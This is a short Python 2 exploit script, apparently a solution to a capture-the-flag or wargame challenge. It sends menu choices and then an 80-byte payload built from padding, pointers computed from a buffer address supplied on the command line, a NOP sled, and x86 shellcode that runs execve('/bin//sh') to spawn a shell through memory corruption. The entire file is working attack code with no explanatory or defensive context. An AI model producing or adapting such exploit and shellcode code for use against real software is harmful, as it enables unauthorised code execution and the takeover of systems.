from struct import pack
from sys import argv

def initiate(payload):
    print '5'
    print '1'
    print payload + '\n'

    return

def main(buff_addr):
    shellcode = '\x31\xc9\x6a\x0b\x58\x99\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

    # Three pointers...
    payload = 'A' * 3 # there are 5 chars already in the buffer, 3 'A' to align
    payload += pack('<I', buff_addr + 4) # second pointer
    payload += pack('<I', buff_addr + 5 + len(payload) + 4) # third pointer, it points to shellcode
    payload += '\x90' * (80 - 5 - len(payload) - len(shellcode))
    payload += shellcode
    payload += pack('<I', buff_addr + 8) # first pointer

    initiate(payload)

    return

if __name__ == '__main__':
    if len(argv) > 1:
        buff_addr = int(argv[1])
        main(buff_addr)
